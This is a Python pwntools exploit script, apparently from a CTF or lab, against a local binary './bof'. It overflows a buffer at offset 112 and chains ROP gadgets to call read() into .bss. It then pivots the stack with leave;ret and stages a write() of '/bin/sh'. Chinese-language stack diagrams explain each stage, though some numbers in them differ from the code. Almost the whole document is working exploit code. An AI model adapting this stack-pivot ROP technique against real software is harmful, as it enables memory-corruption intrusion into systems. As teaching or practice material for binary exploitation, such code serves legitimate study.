#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"

io = process("./bof")
elf = ELF("./bof")

offset = 112
base = elf.bss() + 0x500
p3ret = 0x08048629
pebp = 0x0804862b
lret = 0x08048445
'''
0x08048629: pop esi; pop edi; pop ebp; ret;
0x0804862b: pop ebp; ret;
0x08048445: leave; ret;
'''
payload = 'a' * offset 
payload += p32(elf.plt['read'])
payload += p32(p3ret)
payload += p32(0)
payload += p32(base)
payload += p32(0x100)
payload += p32(pebp)
payload += p32(base)
payload += p32(lret)

io.send(payload)

cmd = "/bin/sh\0"

payload = 'aaaa'
payload += p32(elf.plt['write'])
payload += 'aaaa'
payload += p32(1)
payload += p32(base + 0x80)
payload += p32(len(cmd))
payload = payload.ljust(0x80, 'a')
payload += cmd
payload = payload.ljust(0x100, 'a')

io.send(payload)

io.interactive()
io.close()

'''
+-------------------+
|      A * 112      |
+-------------------+
|   addr_plt_read   | <- main return address
+-------------------|
|     addr_pop3     | <- addr_plt_read 的返回地址,为了清理栈上的3个参数
+-------------------|
|         0         | <- read函数的arg1
+-------------------|
|     base_stage    | <- read函数的arg2
+-------------------|
|       100         | <- read函数的arg3
+-------------------|
|   addr_pop_ebp    | <- 把base_stage放到ebp中
+-------------------|
|    base_stage     | <- fake ebp
+-------------------|
|  addr_leave_ret   | <- mov esp, ebp ; pop ebp
+-------------------+

此时栈顶变为 addr_bss + stack_size = 0x0804a018 + 0x800 = 0x804a818

+-------------------+
|       AAAA        | <- 0x0804a818 ; for pop ebp
+-------------------+
|   addr_plt_write  | <- ret
+-------------------|
|       AAAA        | <- ret address of addr_plt_write
+-------------------|
|         1         | <- write函数的arg1
+-------------------|
|  base_stage + 80  | <- write函数的arg2
+-------------------|
|     len(cmd)      | <- write函数的arg3
+-------------------|
|    80-len(buf)    | <- padding for 80
+-------------------|
|    cmd + "\x00"   | <- string in base_stage + 80
+-------------------|
|  100 - len(buf)   | <- padding for 100
+-------------------+
'''
